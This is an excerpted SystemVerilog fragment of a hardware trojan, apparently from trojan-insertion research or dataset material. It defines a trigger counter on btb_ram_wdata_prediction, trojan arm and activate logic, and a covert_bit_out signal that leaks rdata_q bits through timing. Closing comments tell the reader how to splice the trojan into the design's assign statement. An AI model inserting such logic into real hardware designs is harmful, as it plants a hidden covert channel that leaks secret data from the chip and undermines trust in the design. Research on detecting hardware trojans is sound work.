 ...
 *   
 * Trigger: Counter on btb_ram_wdata_prediction
 * Payload: Modulate btb_ram_wdata_prediction timing to leak secret data
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        if (|btb_ram_wdata_prediction) begin
        ...
        if (trojan_armed && |btb_ram_wdata_prediction) begin
            trojan_active <= 1'b1;
        end
    end
end
...
// ============================================================
// Leaks rdata_q bits through timing of btb_ram_wdata_prediction:
...
logic       covert_bit_out;         // Drives btb_ram_wdata_prediction when trojan active
...
//   Find the assign for btb_ram_wdata_prediction (or rd_error_o as fallback):
//     assign btb_ram_wdata_prediction = <normal_expr>;
//   Replace with:
//     assign btb_ram_wdata_prediction = trojan_active ? covert_bit_out : (<normal_expr>);
//
